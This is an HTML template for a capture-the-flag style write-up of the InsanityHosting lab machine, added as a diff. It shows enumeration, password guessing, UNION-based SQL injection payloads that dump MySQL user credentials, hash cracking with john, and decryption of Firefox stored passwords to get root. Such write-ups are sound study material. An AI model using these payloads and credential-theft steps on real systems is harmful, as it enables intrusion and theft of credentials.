@@ -1,0 +1,198 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play InsanityHosting</h1>
+    <p class="text">Difficulty : Hard | CommunityRating : Very Hard | MyRating : ...</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: ERROR
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.210
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31:9f (RSA)
+|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
+|_  256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
+|_http-title: Insanity - UK and European Servers
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
+| http-methods: 
+|_  Potentially risky methods: TRACE</code></pre></div>
+
+<p class="text">HTTP and FTP is open. Though FTP allows anonymous login, there was no files.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/1.png' %}" alt="">
+    <p class="text">There is no interesting information.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -x php,html -t 70</u>
+└─$ cat gobuster | grep 301
+/css                  (Status: 301) [Size: 235] [--&lt; http://192.168.187.124/css/]
+/data                 (Status: 301) [Size: 236] [--&lt; http://192.168.187.124/data/]
+/fonts                (Status: 301) [Size: 237] [--&lt; http://192.168.187.124/fonts/]
+/img                  (Status: 301) [Size: 235] [--&lt; http://192.168.187.124/img/]
+/js                   (Status: 301) [Size: 234] [--&lt; http://192.168.187.124/js/]
+/monitoring           (Status: 301) [Size: 242] [--&lt; http://192.168.187.124/monitoring/]
+/news                 (Status: 301) [Size: 236] [--&lt; http://192.168.187.124/news/]
+/phpmyadmin           (Status: 301) [Size: 242] [--&lt; http://192.168.187.124/phpmyadmin/]
+/webmail              (Status: 301) [Size: 239] [--&lt; http://192.168.187.124/webmail/]</code></pre></div>
+<p class="text">There are too many dirs. But we can ignore css,data,fonts,img and js pages.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/2.png' %}" alt="">
+    <p class="text">There was name Otis, which may be the username we can use somewhere.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/3.png' %}" alt="">
+    <img src="{% static 'EthHack/images/insanityhosting/4.png' %}" alt="">
+</div>
+<p class="text">Both pages are requiring password and username. We may try use otis as username.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/5.png' %}" alt="">
+    <p class="text">I sent the login request of monitoring page, and sent it to instuder. Then, set the password wordlist 'rockyou.txt'.</p>
+</div>
+
+<p class="text">However, nothing correct password returned. Therefore, I had to guess password.</p>
+<p class="text">otis : 123456 was password. </p>
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/6.png' %}" alt="">
+    <p class="text">There was a row localhost         127.0.0.1  on the page. Since I guessed that the host uses ping to check it's up or down, I injected whoami command. But something never happen.</p>\
+</div>
+<p class="text">Since there was no stuff I could do, I moved on to SquirrelMail. I could enter with the same password and username : otis : 123456.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/7.png' %}" alt="">
+    <img src="{% static 'EthHack/images/insanityhosting/8.png' %}" alt="">
+</div>
+<p class="text">Opening the page, some emails are arrived, and the email contains columns like ID, Host, Date Time, and Status. It's like SQL columns. It's worth checking SQL injeciton.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/9.png' %}" alt="">
+    <p class="text">The hostname <u>' or 1=1; -- - </u> returned localhost. So, it's vulnerable against SQLinjection. <br><br>It's impossible.</p>
+</div>
+
+<p class="text">Since displayed columns are 5, I can start UNION based SQLinjection from 5 variables.</p>
+
+<div class="code-box"><pre><code>test” UNION SELECT @@hostname, @@version, database(), null; #</code></pre></div>
+
+<div class="code-box"><pre><code>test” UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #</code></pre></div>
+
+<div class="code-box"><pre><code>test” UNION SELECT 1, user, password, authentication_string FROM mysql.user; #</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/insanityhosting/10.png' %}" alt="">
+    <p class="text">Then i got credentials</p>
+</div>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ echo '*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9' > hash               
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 SSE2 4x])
+Warning: no OpenMP support for this hash type, consider --fork=5
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<u>elliot123</u>        (?)     
+1g 0:00:00:00 DONE (2025-11-13 08:55) 25.00g/s 3309Kp/s 3309Kc/s 3309KC/s elmo19..elliot123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. </code></pre></div>
+
+<p class="text">elliot123 is the password for elliot. We can ssh using this cred.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>[root@insanityhosting ~]# ls -la
+total 24
+dr-xr-x---.  6 root root 186 Nov 13 11:41 .
+dr-xr-xr-x. 17 root root 244 Dec 15  2020 ..
+lrwxrwxrwx.  1 root root   9 Aug 16  2020 .bash_history -> /dev/null
+-rw-r--r--.  1 root root  18 Dec 29  2013 .bash_logout
+-rw-r--r--.  1 root root 176 Dec 29  2013 .bash_profile
+-rw-r--r--.  1 root root 176 Dec 29  2013 .bashrc
+-rw-r--r--.  1 root root  32 Dec 15  2020 flag.txt
+drwx------.  2 root root  99 Aug 16  2020 .gnupg
+drwx------.  5 root root  66 Aug 16  2020 .mozilla
+drwxr-----.  3 root root  19 Aug 16  2020 .pki
+-rw-------   1 root root  33 Nov 13 11:42 proof.txt
+drwx------.  2 root root  25 Aug 16  2020 .ssh
+-rw-------   1 root root 651 Dec 15  2020 .viminfo
+[root@insanityhosting ~]# </code></pre></div>
+
+<p class="text">Under the home directory, I found .mozilla folder.</p>
+<div class="code-box"><pre><code>[root@insanityhosting .mozilla]# ls
+extensions  firefox  systemextensionsdev
+[root@insanityhosting .mozilla]# cd firefox
+[root@insanityhosting firefox]# ls
+92cwmto8.default-default  installs.ini  oygdg7pb.default  profiles.ini
+[root@insanityhosting firefox]# </code></pre></div>
+
+<p class="text">There is firefox foloder, and 92cwmto8.default-default folder, which seems to store user credential.</p>
+
+<div class="code-box"><pre><code>[root@insanityhosting 92cwmto8.default-default]# ls
+addons.json            content-prefs.sqlite        favicons.sqlite      places.sqlite-wal        times.json
+addonStartup.json.lz4  cookies.sqlite              favicons.sqlite-wal  prefs.js                 webappsstore.sqlite
+bookmarkbackups        cookies.sqlite-wal          handlers.json        search.json.mozlz4       webappsstore.sqlite-wal
+cert9.db               datareporting               key4.db              sessionCheckpoints.json  xulstore.json
+cert_override.txt      extension-preferences.json  permissions.sqlite   sessionstore-backups
+compatibility.ini      extensions                  pkcs11.txt           storage
+containers.json        extensions.json             places.sqlite        storage.sqlite
+[root@insanityhosting 92cwmto8.default-default]# </code></pre></div>
+
+<p class="text">Since there are several databases, we can decrypt user credentials stored by mozilla.</p>
+<p class="text">For that purpose, we can use <a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">this tool</a> called firefox_decrypt.py.</p>
+
+<div class="code-box"><pre><code>We can install this file and unzip it. Then, copy this python code to target host and...</code></pre></div>
+
+<div class="code-box"><pre><code>[elliot@insanityhosting esmhp32w.default-default]$ python firefox_decrypt.py
+Select the Firefox profile you wish to decrypt
+1 -> wqqe31s0.default
+2 -> esmhp32w.default-default
+2
+
+Master Password for profile /home/elliot/.mozilla/firefox/esmhp32w.default-default: 
+2025-11-13 14:53:54,807 - WARNING - Attempting decryption with no Master Password
+
+Website:   https://localhost:10000
+Username: 'root'
+Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
+[elliot@insanityhosting esmhp32w.default-default]$ </code></pre></div>
+
+<p class="text">Without password enter, I could decrypt user stored credential. </p>
+
+<div class="code-box"><pre><code>[elliot@insanityhosting esmhp32w.default-default]$ su root
+Password: 
+[root@insanityhosting esmhp32w.default-default]# whoami
+root
+[root@insanityhosting esmhp32w.default-default]# </code></pre></div>
+
+<p class="text">I could change user into root.</p>
+
+
+</body>
+</html>
